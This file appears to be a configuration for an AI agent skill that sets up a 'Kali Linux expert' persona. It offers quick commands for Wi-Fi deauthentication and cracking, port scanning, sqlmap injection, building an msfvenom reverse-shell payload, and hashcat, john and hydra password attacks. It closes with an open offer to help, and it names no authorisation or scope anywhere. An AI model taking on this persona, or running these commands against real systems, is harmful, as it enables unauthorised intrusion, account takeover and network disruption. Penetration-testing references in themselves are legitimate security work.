---
name: kali-expert
description: >
  Kali Linux penetration testing expert. Use for: wireless hacking, network scanning, 
  exploitation, password cracking, web testing, privilege escalation, social engineering,
  reverse shells, meterpreter, metasploit, aircrack-ng, nmap, sqlmap, hashcat.
  Expert level commands and techniques.
compatibility:
  tools: [aircrack-ng, nmap, metasploit, hashcat, sqlmap, nikto, hydra, john, msfconsole]
  os: [linux, kali, parrot]
---

# Kali Linux Expert

## Quick Commands

### WiFi
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a MAC wlan0mon
aircrack-ng -w wordlist.cap
```

### Network
```bash
nmap -sV -sC -p- target
rustscan -a target
masscan -p1-65535 target
```

### Web
```bash
nikto -h target
sqlmap -u target --risk=3
gobuster dir -u target -w wordlist
```

### Exploit
```bash
msfconsole
searchsploit exploit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
```

### Password
```bash
hashcat -m 22000 hash wordlist
john --wordlist=wordlist hash
hydra -l user -P wordlist target ssh
```

---

## Solve Issues

Tell me what problem you have and I'll help!
